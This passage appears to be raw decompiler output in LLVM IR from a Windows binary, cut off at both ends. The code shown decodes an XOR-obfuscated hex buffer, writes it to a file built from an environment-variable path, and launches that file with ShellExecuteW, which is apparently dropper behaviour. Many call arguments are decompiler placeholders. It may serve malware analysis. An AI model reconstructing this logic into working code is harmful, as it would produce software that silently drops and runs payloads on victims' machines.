  store i8 %255, i8* %eax.0.reg2mem, !insn.addr !5614
  br label %dec_label_pc_10009a7a, !insn.addr !5614

dec_label_pc_10009a69:                            ; preds = %dec_label_pc_10009a5a
  %256 = add i8 %250, -97, !insn.addr !5615
  %257 = icmp ult i8 %256, 6
  %258 = add i8 %250, -87
  %spec.select = select i1 %257, i8 %258, i8 0
  store i8 %spec.select, i8* %eax.0.reg2mem
  br label %dec_label_pc_10009a7a

dec_label_pc_10009a7a:                            ; preds = %dec_label_pc_10009a48, %dec_label_pc_10009a69, %dec_label_pc_10009a61
  %eax.0.reload = load i8, i8* %eax.0.reg2mem
  %259 = add i32 %248, 1, !insn.addr !5616
  %260 = inttoptr i32 %259 to i8*, !insn.addr !5616
  %261 = load i8, i8* %260, align 1, !insn.addr !5616
  %262 = add i8 %261, -48, !insn.addr !5617
  %263 = icmp ult i8 %262, 10
  store i8 %262, i8* %ecx.1.reg2mem, !insn.addr !5618
  br i1 %263, label %dec_label_pc_10009ab0, label %dec_label_pc_10009a8e, !insn.addr !5618

dec_label_pc_10009a8e:                            ; preds = %dec_label_pc_10009a7a
  %264 = add i8 %261, -65, !insn.addr !5619
  %265 = icmp ult i8 %264, 6
  br i1 %265, label %dec_label_pc_10009a96, label %dec_label_pc_10009a9e, !insn.addr !5620

dec_label_pc_10009a96:                            ; preds = %dec_label_pc_10009a8e
  %266 = add i8 %261, -55, !insn.addr !5621
  store i8 %266, i8* %ecx.1.reg2mem, !insn.addr !5622
  br label %dec_label_pc_10009ab0, !insn.addr !5622

dec_label_pc_10009a9e:                            ; preds = %dec_label_pc_10009a8e
  %267 = add i8 %261, -97, !insn.addr !5623
  %268 = icmp ult i8 %267, 6
  %269 = add i8 %261, -87
  %spec.select18 = select i1 %268, i8 %269, i8 0
  store i8 %spec.select18, i8* %ecx.1.reg2mem
  br label %dec_label_pc_10009ab0

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009a7a, %dec_label_pc_10009a9e, %dec_label_pc_10009a96
  %ecx.1.reload = load i8, i8* %ecx.1.reg2mem
  %270 = mul i8 %eax.0.reload, 16, !insn.addr !5624
  %271 = add i8 %ecx.1.reload, %270, !insn.addr !5625
  %272 = xor i8 %271, 35, !insn.addr !5626
  %273 = mul i8 %272, 8, !insn.addr !5626
  %274 = udiv i8 %272, 32, !insn.addr !5626
  %275 = or i8 %274, %273, !insn.addr !5626
  %276 = add i32 %esi.1.reload, %234, !insn.addr !5627
  %277 = inttoptr i32 %276 to i8*, !insn.addr !5627
  store i8 %275, i8* %277, align 1, !insn.addr !5627
  %278 = add i32 %esi.1.reload, 1, !insn.addr !5628
  %279 = icmp eq i32 %278, %245, !insn.addr !5629
  %280 = icmp eq i1 %279, false, !insn.addr !5630
  store i32 %278, i32* %esi.1.reg2mem, !insn.addr !5630
  br i1 %280, label %dec_label_pc_10009a48, label %dec_label_pc_10009ac2, !insn.addr !5630

dec_label_pc_10009ac2:                            ; preds = %dec_label_pc_10009ab0, %dec_label_pc_10009a0d
  %281 = add i32 %esp.1.reload, -104, !insn.addr !5631
  %282 = inttoptr i32 %281 to i32*, !insn.addr !5631
  store i32 260, i32* %282, align 4, !insn.addr !5631
  %283 = add i32 %esp.1.reload, -108
  %284 = inttoptr i32 %283 to i32*
  store i32 0, i32* %284, align 4, !insn.addr !5632
  %285 = add i32 %esp.1.reload, -112
  %286 = inttoptr i32 %285 to i32*
  %287 = ptrtoint i32* %stack_var_-1000 to i32, !insn.addr !5633
  store i32 %287, i32* %286, align 4, !insn.addr !5633
  %288 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5634
  store i32 1416914247, i32* %stack_var_-1000, align 4, !insn.addr !5635
  %289 = call i32 @function_10009390(), !insn.addr !5636
  %sext17 = mul i32 %1, 16777216
  %290 = sdiv i32 %sext17, 16777216, !insn.addr !5637
  %291 = icmp eq i32 %0, 0, !insn.addr !5638
  store i1 true, i1* %.reg2mem24, !insn.addr !5639
  store i32 %238, i32* %esp.5.reg2mem, !insn.addr !5639
  br i1 %291, label %dec_label_pc_10009d5c, label %dec_label_pc_10009b2a, !insn.addr !5639

dec_label_pc_10009b2a:                            ; preds = %dec_label_pc_10009ac2
  %292 = inttoptr i32 %289 to i16*, !insn.addr !5640
  store i32 %290, i32* %282, align 4, !insn.addr !5641
  %293 = call i32 @lstrlenW(i16* %292), !insn.addr !5642
  %294 = icmp eq i32 %0, 3, !insn.addr !5643
  store i1 true, i1* %.reg2mem, !insn.addr !5644
  br i1 %294, label %dec_label_pc_10009d3d, label %dec_label_pc_10009b7e, !insn.addr !5644

dec_label_pc_10009b7e:                            ; preds = %dec_label_pc_10009b2a
  %295 = mul i32 %293, 2, !insn.addr !5645
  %296 = add i32 %295, %290, !insn.addr !5645
  %297 = add i32 %296, 1, !insn.addr !5646
  %298 = inttoptr i32 %297 to i8*, !insn.addr !5646
  store i8 0, i8* %298, align 1, !insn.addr !5646
  %299 = udiv i32 %0, 26, !insn.addr !5647
  %300 = urem i32 %0, 26
  %301 = trunc i32 %300 to i8
  %302 = add nuw i8 %301, 97, !insn.addr !5648
  %303 = inttoptr i32 %296 to i8*, !insn.addr !5648
  store i8 %302, i8* %303, align 1, !insn.addr !5648
  %304 = add i32 %296, 3, !insn.addr !5649
  %305 = inttoptr i32 %304 to i16*, !insn.addr !5649
  store i16 0, i16* %305, align 2, !insn.addr !5649
  %306 = add i32 %296, 5, !insn.addr !5650
  %307 = inttoptr i32 %306 to i8*, !insn.addr !5650
  store i8 0, i8* %307, align 1, !insn.addr !5650
  %308 = urem i32 %299, 26
  %309 = trunc i32 %308 to i8
  %310 = add nuw nsw i8 %309, 65, !insn.addr !5651
  %311 = add i32 %296, 2, !insn.addr !5651
  %312 = inttoptr i32 %311 to i8*, !insn.addr !5651
  store i8 %310, i8* %312, align 1, !insn.addr !5651
  %313 = icmp eq i32 %0, 1, !insn.addr !5652
  %314 = icmp eq i1 %313, false, !insn.addr !5653
  br i1 %314, label %dec_label_pc_10009c2e, label %dec_label_pc_10009b87, !insn.addr !5653

dec_label_pc_10009b87:                            ; preds = %dec_label_pc_10009b7e
  %315 = add i32 %234, 1000, !insn.addr !5654
  %316 = inttoptr i32 %315 to i8*, !insn.addr !5654
  %317 = load i8, i8* %316, align 1, !insn.addr !5654
  %318 = icmp eq i8 %317, 0, !insn.addr !5654
  store i1 false, i1* %.reg2mem, !insn.addr !5655
  br i1 %318, label %dec_label_pc_10009d3d, label %dec_label_pc_10009b94, !insn.addr !5655

dec_label_pc_10009b94:                            ; preds = %dec_label_pc_10009b87
  store i32 512, i32* %284, align 4, !insn.addr !5656
  store i32 %290, i32* %286, align 4, !insn.addr !5657
  %319 = add i32 %esp.1.reload, -116, !insn.addr !5658
  %320 = inttoptr i32 %319 to i32*, !insn.addr !5658
  store i32 ptrtoint (i32* @global_var_100409b8 to i32), i32* %320, align 4, !insn.addr !5658
  %321 = call i32 @GetEnvironmentVariableW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5659
  %322 = add i32 %esp.1.reload, -120, !insn.addr !5660
  %323 = inttoptr i32 %322 to i32*, !insn.addr !5660
  store i32 %290, i32* %323, align 4, !insn.addr !5660
  %324 = call i32 @lstrlenW(i16* bitcast (i32* @1 to i16*)), !insn.addr !5661
  %325 = add i32 %esp.1.reload, -124, !insn.addr !5662
  %326 = inttoptr i32 %325 to i32*, !insn.addr !5662
  store i32 ptrtoint (i16** @global_var_10040958 to i32), i32* %326, align 4, !insn.addr !5662
  %327 = add i32 %esp.1.reload, -128, !insn.addr !5663
  %328 = inttoptr i32 %327 to i32*, !insn.addr !5663
  store i32 %290, i32* %328, align 4, !insn.addr !5663
  %329 = mul i32 %324, 2, !insn.addr !5664
  %330 = add i32 %329, %290, !insn.addr !5664
  %331 = inttoptr i32 %330 to i32*, !insn.addr !5664
  store i32 92, i32* %331, align 4, !insn.addr !5664
  %332 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5665
  %333 = add i32 %esp.1.reload, -132, !insn.addr !5666
  %334 = inttoptr i32 %333 to i32*, !insn.addr !5666
  store i32 ptrtoint ([19 x i16]* @global_var_10039524 to i32), i32* %334, align 4, !insn.addr !5666
  %335 = add i32 %esp.1.reload, -136, !insn.addr !5667
  %336 = inttoptr i32 %335 to i32*, !insn.addr !5667
  store i32 %290, i32* %336, align 4, !insn.addr !5667
  %337 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5668
  %338 = add i32 %esp.1.reload, -140, !insn.addr !5669
  %339 = inttoptr i32 %338 to i32*, !insn.addr !5669
  %340 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !5669
  store i32 %340, i32* %339, align 4, !insn.addr !5669
  %341 = add i32 %esp.1.reload, -144, !insn.addr !5670
  %342 = inttoptr i32 %341 to i32*, !insn.addr !5670
  store i32 %290, i32* %342, align 4, !insn.addr !5670
  %343 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5671
  %344 = add i32 %esp.1.reload, -148, !insn.addr !5672
  %345 = inttoptr i32 %344 to i32*, !insn.addr !5672
  store i32 %290, i32* %345, align 4, !insn.addr !5672
  %346 = call i32 @lstrlenW(i16* bitcast (i32* @1 to i16*)), !insn.addr !5673
  %347 = mul i32 %346, 2, !insn.addr !5674
  %348 = add i32 %347, %290, !insn.addr !5674
  %349 = load i8, i8* %316, align 1, !insn.addr !5675
  %350 = and i8 %349, 15, !insn.addr !5676
  %351 = add i32 %348, 1, !insn.addr !5677
  %352 = inttoptr i32 %351 to i8*, !insn.addr !5677
  store i8 0, i8* %352, align 1, !insn.addr !5677
  %353 = add nuw nsw i8 %350, 97, !insn.addr !5678
  %354 = inttoptr i32 %348 to i8*, !insn.addr !5679
  store i8 %353, i8* %354, align 1, !insn.addr !5679
  %355 = load i8, i8* %316, align 1, !insn.addr !5680
  %356 = udiv i8 %355, 16
  %357 = add i32 %348, 3, !insn.addr !5681
  %358 = inttoptr i32 %357 to i16*, !insn.addr !5681
  store i16 0, i16* %358, align 2, !insn.addr !5681
  %359 = add nuw nsw i8 %356, 65, !insn.addr !5682
  %360 = add i32 %348, 2, !insn.addr !5682
  %361 = inttoptr i32 %360 to i8*, !insn.addr !5682
  store i8 %359, i8* %361, align 1, !insn.addr !5682
  %362 = add i32 %348, 5, !insn.addr !5683
  %363 = inttoptr i32 %362 to i8*, !insn.addr !5683
  store i8 0, i8* %363, align 1, !insn.addr !5683
  %364 = add i32 %esp.1.reload, -152, !insn.addr !5684
  %365 = inttoptr i32 %364 to i32*, !insn.addr !5684
  %366 = ptrtoint i16** %stack_var_-32 to i32, !insn.addr !5684
  store i32 %366, i32* %365, align 4, !insn.addr !5684
  %367 = add i32 %esp.1.reload, -156, !insn.addr !5685
  %368 = inttoptr i32 %367 to i32*, !insn.addr !5685
  store i32 %290, i32* %368, align 4, !insn.addr !5685
  store i16* inttoptr (i32 6619182 to i16*), i16** %stack_var_-32, align 4, !insn.addr !5686
  %369 = call i16* @lstrcatW(i16* inttoptr (i32 6619182 to i16*), i16* inttoptr (i32 6619256 to i16*)), !insn.addr !5687
  store i1 false, i1* %.reg2mem24, !insn.addr !5688
  store i32 %367, i32* %esp.5.reg2mem, !insn.addr !5688
  br label %dec_label_pc_10009d5c, !insn.addr !5688

dec_label_pc_10009c2e:                            ; preds = %dec_label_pc_10009b7e
  %370 = icmp eq i32 %0, 2, !insn.addr !5689
  %371 = icmp eq i1 %370, false, !insn.addr !5690
  store i1 true, i1* %.reg2mem24, !insn.addr !5690
  store i32 %281, i32* %esp.5.reg2mem, !insn.addr !5690
  br i1 %371, label %dec_label_pc_10009d5c, label %dec_label_pc_10009c37, !insn.addr !5690

dec_label_pc_10009c37:                            ; preds = %dec_label_pc_10009c2e
  %372 = add i32 %234, 50, !insn.addr !5691
  %373 = inttoptr i32 %372 to i8*, !insn.addr !5691
  %374 = load i8, i8* %373, align 1, !insn.addr !5691
  %375 = icmp eq i8 %374, 0, !insn.addr !5691
  store i32 %281, i32* %esp.3.reg2mem, !insn.addr !5692
  br i1 %375, label %dec_label_pc_10009ce2, label %dec_label_pc_10009c41, !insn.addr !5692

dec_label_pc_10009c41:                            ; preds = %dec_label_pc_10009c37
  store i32 512, i32* %284, align 4, !insn.addr !5693
  store i32 %290, i32* %286, align 4, !insn.addr !5694
  %376 = add i32 %esp.1.reload, -116, !insn.addr !5695
  %377 = inttoptr i32 %376 to i32*, !insn.addr !5695
  store i32 ptrtoint (i32* @global_var_100409b8 to i32), i32* %377, align 4, !insn.addr !5695
  %378 = call i32 @GetEnvironmentVariableW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5696
  %379 = add i32 %esp.1.reload, -120, !insn.addr !5697
  %380 = inttoptr i32 %379 to i32*, !insn.addr !5697
  store i32 %290, i32* %380, align 4, !insn.addr !5697
  %381 = call i32 @lstrlenW(i16* bitcast (i32* @1 to i16*)), !insn.addr !5698
  %382 = add i32 %esp.1.reload, -124, !insn.addr !5699
  %383 = inttoptr i32 %382 to i32*, !insn.addr !5699
  store i32 ptrtoint (i16** @global_var_10040958 to i32), i32* %383, align 4, !insn.addr !5699
  %384 = add i32 %esp.1.reload, -128, !insn.addr !5700
  %385 = inttoptr i32 %384 to i32*, !insn.addr !5700
  store i32 %290, i32* %385, align 4, !insn.addr !5700
  %386 = mul i32 %381, 2, !insn.addr !5701
  %387 = add i32 %386, %290, !insn.addr !5701
  %388 = inttoptr i32 %387 to i32*, !insn.addr !5701
  store i32 92, i32* %388, align 4, !insn.addr !5701
  %389 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5702
  %390 = add i32 %esp.1.reload, -132, !insn.addr !5703
  %391 = inttoptr i32 %390 to i32*, !insn.addr !5703
  %392 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !5703
  store i32 %392, i32* %391, align 4, !insn.addr !5703
  %393 = add i32 %esp.1.reload, -136, !insn.addr !5704
  %394 = inttoptr i32 %393 to i32*, !insn.addr !5704
  store i32 %290, i32* %394, align 4, !insn.addr !5704
  %395 = call i16* @lstrcatW(i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*)), !insn.addr !5705
  %396 = load i8, i8* %373, align 1, !insn.addr !5706
  %397 = zext i8 %396 to i32, !insn.addr !5706
  %398 = add i32 %esp.1.reload, -140, !insn.addr !5707
  %399 = inttoptr i32 %398 to i32*, !insn.addr !5707
  store i32 %290, i32* %399, align 4, !insn.addr !5707
  %400 = inttoptr i32 %397 to i16*, !insn.addr !5708
  %401 = call i32 @lstrlenW(i16* %400), !insn.addr !5708
  %402 = mul i32 %401, 2, !insn.addr !5709
  %403 = add i32 %402, %290, !insn.addr !5709
  %404 = icmp ugt i8 %396, 9, !insn.addr !5710
  br i1 %404, label %dec_label_pc_10009ca2, label %dec_label_pc_10009c91, !insn.addr !5710

dec_label_pc_10009c91:                            ; preds = %dec_label_pc_10009c41
  %405 = add i32 %403, 1, !insn.addr !5711
  %406 = inttoptr i32 %405 to i16*, !insn.addr !5711
  store i16 0, i16* %406, align 2, !insn.addr !5711
  %407 = add i8 %396, 48, !insn.addr !5712
  %408 = inttoptr i32 %403 to i8*, !insn.addr !5712
  store i8 %407, i8* %408, align 1, !insn.addr !5712
  %409 = add i32 %403, 3, !insn.addr !5713
  %410 = inttoptr i32 %409 to i8*, !insn.addr !5713
  store i8 0, i8* %410, align 1, !insn.addr !5713
  store i32 %398, i32* %esp.3.reg2mem, !insn.addr !5714
  br label %dec_label_pc_10009ce2, !insn.addr !5714

dec_label_pc_10009ca2:                            ; preds = %dec_label_pc_10009c41
  %411 = icmp ugt i8 %396, 99, !insn.addr !5715
  store i32 %398, i32* %esp.3.reg2mem, !insn.addr !5715
  br i1 %411, label %dec_label_pc_10009ce2, label %dec_label_pc_10009ca7, !insn.addr !5715

dec_label_pc_10009ca7:                            ; preds = %dec_label_pc_10009ca2
  %412 = add i32 %403, 1, !insn.addr !5716
  %413 = inttoptr i32 %412 to i8*, !insn.addr !5716
  store i8 0, i8* %413, align 1, !insn.addr !5716
  %414 = add i32 %403, 3, !insn.addr !5717
  %415 = inttoptr i32 %414 to i16*, !insn.addr !5717
  store i16 0, i16* %415, align 2, !insn.addr !5717
  %416 = add i32 %403, 5, !insn.addr !5718
  %417 = inttoptr i32 %416 to i8*, !insn.addr !5718
  store i8 0, i8* %417, align 1, !insn.addr !5718
  %418 = udiv i8 %396, 10
  %419 = add nuw nsw i8 %418, 48, !insn.addr !5719
  %420 = inttoptr i32 %403 to i8*, !insn.addr !5719
  store i8 %419, i8* %420, align 1, !insn.addr !5719
  %421 = mul i8 %418, -10
  %422 = add i8 %396, 48, !insn.addr !5720
  %423 = add i8 %422, %421, !insn.addr !5721
  %424 = add i32 %403, 2, !insn.addr !5722
  %425 = inttoptr i32 %424 to i8*, !insn.addr !5722
  store i8 %423, i8* %425, align 1, !insn.addr !5722
  store i32 %398, i32* %esp.3.reg2mem, !insn.addr !5722
  br label %dec_label_pc_10009ce2, !insn.addr !5722

dec_label_pc_10009ce2:                            ; preds = %dec_label_pc_10009ca7, %dec_label_pc_10009ca2, %dec_label_pc_10009c91, %dec_label_pc_10009c37
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  store i16* inttoptr (i32 6553646 to i16*), i16** %stack_var_-32, align 4, !insn.addr !5723
  %426 = add i32 %esp.3.reload, -4, !insn.addr !5724
  %427 = inttoptr i32 %426 to i32*, !insn.addr !5724
  %428 = ptrtoint i16** %stack_var_-32 to i32, !insn.addr !5724
  store i32 %428, i32* %427, align 4, !insn.addr !5724
  %429 = add i32 %esp.3.reload, -8, !insn.addr !5725
  %430 = inttoptr i32 %429 to i32*, !insn.addr !5725
  store i32 %290, i32* %430, align 4, !insn.addr !5725
  %431 = load i16*, i16** %stack_var_-32, align 4, !insn.addr !5726
  %432 = call i16* @lstrcatW(i16* %431, i16* inttoptr (i32 7077996 to i16*)), !insn.addr !5726
  %433 = add i32 %esp.3.reload, -12, !insn.addr !5727
  %434 = inttoptr i32 %433 to i32*, !insn.addr !5727
  store i32 0, i32* %434, align 4, !insn.addr !5727
  %435 = add i32 %esp.3.reload, -16, !insn.addr !5728
  %436 = inttoptr i32 %435 to i32*, !insn.addr !5728
  store i32 128, i32* %436, align 4, !insn.addr !5728
  %437 = add i32 %esp.3.reload, -20, !insn.addr !5729
  %438 = inttoptr i32 %437 to i32*, !insn.addr !5729
  store i32 2, i32* %438, align 4, !insn.addr !5729
  %439 = add i32 %esp.3.reload, -24, !insn.addr !5730
  %440 = inttoptr i32 %439 to i32*, !insn.addr !5730
  store i32 0, i32* %440, align 4, !insn.addr !5730
  %441 = add i32 %esp.3.reload, -28, !insn.addr !5731
  %442 = inttoptr i32 %441 to i32*, !insn.addr !5731
  store i32 0, i32* %442, align 4, !insn.addr !5731
  %443 = add i32 %esp.3.reload, -32, !insn.addr !5732
  %444 = inttoptr i32 %443 to i32*, !insn.addr !5732
  store i32 1073741824, i32* %444, align 4, !insn.addr !5732
  %445 = add i32 %esp.3.reload, -36, !insn.addr !5733
  %446 = inttoptr i32 %445 to i32*, !insn.addr !5733
  store i32 %290, i32* %446, align 4, !insn.addr !5733
  %447 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !5734
  %448 = ptrtoint i32* %447 to i32, !insn.addr !5734
  %449 = icmp eq i32* %447, inttoptr (i32 -1 to i32*), !insn.addr !5735
  %450 = icmp eq i1 %449, false, !insn.addr !5736
  store i32 %445, i32* %esp.4.reg2mem, !insn.addr !5736
  br i1 %450, label %dec_label_pc_10009d2f, label %dec_label_pc_10009d21, !insn.addr !5736

dec_label_pc_10009d21:                            ; preds = %dec_label_pc_10009ce2
  %451 = add i32 %esp.3.reload, -40, !insn.addr !5737
  %452 = inttoptr i32 %451 to i32*, !insn.addr !5737
  store i32 %290, i32* %452, align 4, !insn.addr !5737
  %453 = add i32 %esp.3.reload, -44, !insn.addr !5738
  %454 = inttoptr i32 %453 to i32*, !insn.addr !5738
  store i32 %448, i32* %454, align 4, !insn.addr !5738
  store i32 %453, i32* %esp.4.reg2mem, !insn.addr !5739
  br label %dec_label_pc_10009d2f, !insn.addr !5739

dec_label_pc_10009d2f:                            ; preds = %dec_label_pc_10009d21, %dec_label_pc_10009ce2
  %esp.4.reload = load i32, i32* %esp.4.reg2mem
  %455 = add i32 %esp.4.reload, -4, !insn.addr !5740
  %456 = inttoptr i32 %455 to i32*, !insn.addr !5740
  store i32 %448, i32* %456, align 4, !insn.addr !5740
  %457 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !5741
  store i1 true, i1* %.reg2mem24, !insn.addr !5742
  store i32 %455, i32* %esp.5.reg2mem, !insn.addr !5742
  br label %dec_label_pc_10009d5c, !insn.addr !5742

dec_label_pc_10009d3d:                            ; preds = %dec_label_pc_10009b2a, %dec_label_pc_10009b87
  %.reload = load i1, i1* %.reg2mem
  store i16* inttoptr (i32 6619182 to i16*), i16** %stack_var_-32, align 4, !insn.addr !5743
  %458 = ptrtoint i16** %stack_var_-32 to i32, !insn.addr !5744
  store i32 %458, i32* %284, align 4, !insn.addr !5744
  store i32 %290, i32* %286, align 4, !insn.addr !5745
  %459 = load i16*, i16** %stack_var_-32, align 4, !insn.addr !5746
  %460 = call i16* @lstrcatW(i16* %459, i16* inttoptr (i32 6619256 to i16*)), !insn.addr !5746
  store i1 %.reload, i1* %.reg2mem24, !insn.addr !5746
  store i32 %285, i32* %esp.5.reg2mem, !insn.addr !5746
  br label %dec_label_pc_10009d5c, !insn.addr !5746

dec_label_pc_10009d5c:                            ; preds = %dec_label_pc_10009c2e, %dec_label_pc_10009ac2, %dec_label_pc_10009d3d, %dec_label_pc_10009d2f, %dec_label_pc_10009b94
  %esp.5.reload = load i32, i32* %esp.5.reg2mem
  %461 = add i32 %esp.5.reload, -4, !insn.addr !5747
  %462 = inttoptr i32 %461 to i32*, !insn.addr !5747
  store i32 0, i32* %462, align 4, !insn.addr !5747
  %463 = add i32 %esp.5.reload, -8, !insn.addr !5748
  %464 = inttoptr i32 %463 to i32*, !insn.addr !5748
  store i32 128, i32* %464, align 4, !insn.addr !5748
  %465 = add i32 %esp.5.reload, -12, !insn.addr !5749
  %466 = inttoptr i32 %465 to i32*, !insn.addr !5749
  store i32 2, i32* %466, align 4, !insn.addr !5749
  %467 = add i32 %esp.5.reload, -16, !insn.addr !5750
  %468 = inttoptr i32 %467 to i32*, !insn.addr !5750
  store i32 0, i32* %468, align 4, !insn.addr !5750
  %469 = add i32 %esp.5.reload, -20, !insn.addr !5751
  %470 = inttoptr i32 %469 to i32*, !insn.addr !5751
  store i32 0, i32* %470, align 4, !insn.addr !5751
  %471 = add i32 %esp.5.reload, -24, !insn.addr !5752
  %472 = inttoptr i32 %471 to i32*, !insn.addr !5752
  store i32 1073741824, i32* %472, align 4, !insn.addr !5752
  %473 = add i32 %esp.5.reload, -28, !insn.addr !5753
  %474 = inttoptr i32 %473 to i32*, !insn.addr !5753
  store i32 %290, i32* %474, align 4, !insn.addr !5753
  %475 = call i32* @CreateFileW(i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !5754
  %476 = icmp eq i32* %475, inttoptr (i32 -1 to i32*), !insn.addr !5755
  %477 = add i32 %esp.5.reload, -32
  %478 = inttoptr i32 %477 to i32*
  br i1 %476, label %dec_label_pc_10009e02, label %dec_label_pc_10009d80, !insn.addr !5756

dec_label_pc_10009d80:                            ; preds = %dec_label_pc_10009d5c
  %.reload25 = load i1, i1* %.reg2mem24
  %479 = ptrtoint i32* %475 to i32, !insn.addr !5754
  store i32 0, i32* %478, align 4, !insn.addr !5757
  %480 = add i32 %esp.5.reload, -36, !insn.addr !5758
  %481 = inttoptr i32 %480 to i32*, !insn.addr !5758
  %482 = ptrtoint i32* %stack_var_-1540 to i32, !insn.addr !5758
  store i32 %482, i32* %481, align 4, !insn.addr !5758
  %483 = add i32 %esp.5.reload, -40, !insn.addr !5759
  %484 = inttoptr i32 %483 to i32*, !insn.addr !5759
  store i32 %245, i32* %484, align 4, !insn.addr !5759
  %485 = add i32 %esp.5.reload, -44, !insn.addr !5760
  %486 = inttoptr i32 %485 to i32*, !insn.addr !5760
  store i32 %234, i32* %486, align 4, !insn.addr !5760
  %487 = add i32 %esp.5.reload, -48, !insn.addr !5761
  %488 = inttoptr i32 %487 to i32*, !insn.addr !5761
  store i32 %479, i32* %488, align 4, !insn.addr !5761
  %489 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !5762
  %490 = add i32 %esp.5.reload, -52, !insn.addr !5763
  %491 = inttoptr i32 %490 to i32*, !insn.addr !5763
  store i32 %479, i32* %491, align 4, !insn.addr !5763
  %492 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !5764
  %493 = add i32 %esp.5.reload, -56, !insn.addr !5765
  %494 = inttoptr i32 %493 to i32*, !insn.addr !5765
  store i32 99, i32* %494, align 4, !insn.addr !5765
  %495 = add i32 %esp.5.reload, -60, !insn.addr !5766
  %496 = inttoptr i32 %495 to i32*, !insn.addr !5766
  store i32 0, i32* %496, align 4, !insn.addr !5766
  %497 = add i32 %esp.5.reload, -64, !insn.addr !5767
  %498 = inttoptr i32 %497 to i32*, !insn.addr !5767
  %499 = ptrtoint i32* %stack_var_-367 to i32, !insn.addr !5767
  store i32 %499, i32* %498, align 4, !insn.addr !5767
  %500 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5768
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-368, align 4, !insn.addr !5769
  %501 = ptrtoint i8** %stack_var_-368 to i32, !insn.addr !5770
  store i32 %501, i32* %494, align 4, !insn.addr !5770
  %502 = load i8*, i8** %stack_var_-368, align 4, !insn.addr !5771
  %503 = call i32* @GetModuleHandleA(i8* %502), !insn.addr !5771
  store i32 %493, i32* %esp.6.reg2mem, !insn.addr !5772
  br i1 %.reload25, label %dec_label_pc_10009e31, label %dec_label_pc_10009dec, !insn.addr !5772

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009d80
  store i32 0, i32* %496, align 4, !insn.addr !5773
  store i32 0, i32* %498, align 4, !insn.addr !5774
  %504 = add i32 %esp.5.reload, -68, !insn.addr !5775
  %505 = inttoptr i32 %504 to i32*, !insn.addr !5775
  store i32 0, i32* %505, align 4, !insn.addr !5775
  %506 = add i32 %esp.5.reload, -72, !insn.addr !5776
  %507 = inttoptr i32 %506 to i32*, !insn.addr !5776
  store i32 %290, i32* %507, align 4, !insn.addr !5776
  %508 = add i32 %esp.5.reload, -76, !insn.addr !5777
  %509 = inttoptr i32 %508 to i32*, !insn.addr !5777
  store i32 ptrtoint ([5 x i16]* @global_var_100394fc to i32), i32* %509, align 4, !insn.addr !5777
  %510 = add i32 %esp.5.reload, -80, !insn.addr !5778
  %511 = inttoptr i32 %510 to i32*, !insn.addr !5778
  store i32 0, i32* %511, align 4, !insn.addr !5778
  %512 = call i32* @ShellExecuteW(i32* nonnull @1, i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5779
  store i32 %510, i32* %esp.6.reg2mem, !insn.addr !5780
  br label %dec_label_pc_10009e31, !insn.addr !5780

dec_label_pc_10009e02:                            ; preds = %dec_label_pc_10009d5c
  store i32 4, i32* %478, align 4, !insn.addr !5781
  %513 = add i32 %esp.5.reload, -36, !insn.addr !5782
  %514 = inttoptr i32 %513 to i32*, !insn.addr !5782
  store i32 12288, i32* %514, align 4, !insn.addr !5782
  %515 = add nsw i32 %245, 10, !insn.addr !5783
  %516 = add i32 %esp.5.reload, -40, !insn.addr !5784
  %517 = inttoptr i32 %516 to i32*, !insn.addr !5784
  store i32 %515, i32* %517, align 4, !insn.addr !5784
  %518 = add i32 %esp.5.reload, -44, !insn.addr !5785
  %519 = inttoptr i32 %518 to i32*, !insn.addr !5785
  store i32 0, i32* %519, align 4, !insn.addr !5785
  %520 = icmp slt i32 %244, 2
  store i32 %518, i32* %esp.6.reg2mem, !insn.addr !5786
  br i1 %520, label %dec_label_pc_10009e31, label %dec_label_pc_10009e21, !insn.addr !5786

dec_label_pc_10009e21:                            ; preds = %dec_label_pc_10009e02
  %521 = add i32 %esp.1.reload, -44, !insn.addr !5787
  %522 = inttoptr i32 %521 to i32*, !insn.addr !5787
  %.neg = add i32 %234, -10
  %523 = sub i32 %.neg, %245, !insn.addr !5788
